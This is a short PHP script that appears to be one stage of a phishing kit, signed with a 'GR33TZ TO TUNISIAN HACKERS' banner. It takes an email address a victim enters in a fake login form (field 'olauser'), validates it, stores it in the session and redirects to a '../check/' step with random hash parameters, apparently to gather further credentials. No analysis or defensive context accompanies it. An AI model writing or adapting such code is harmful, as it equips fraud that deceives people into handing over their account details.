<?php
/*
***********************************************************
*                                                         *
*                                                         *
*                                                         *
*                                                         *
*             GR33TZ TO TUNISIAN HACKERS                  *
*                                                         *
***********************************************************
*/
session_start();
$email= $_POST['olauser'];
	if ( ( !$email ) ||
		 ( strlen($_POST['email']) > 35 ) ||
	     ( !preg_match("#^[A-Za-z0-9](([_\.\-]?[a-zA-Z0-9]+)*)@([A-Za-z0-9]+)(([\.\-]?[a-zA-Z0-9]+)*)\.([A-Za-z]{2,})$#", $email) )
       ) 
	{ 
		header('Location: ./?False='.md5(microtime()));
		exit; 
	} 
$_SESSION['_USER_']=$_POST['olauser'];
header("Location: ../check/?=".$_SESSION['_L']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?>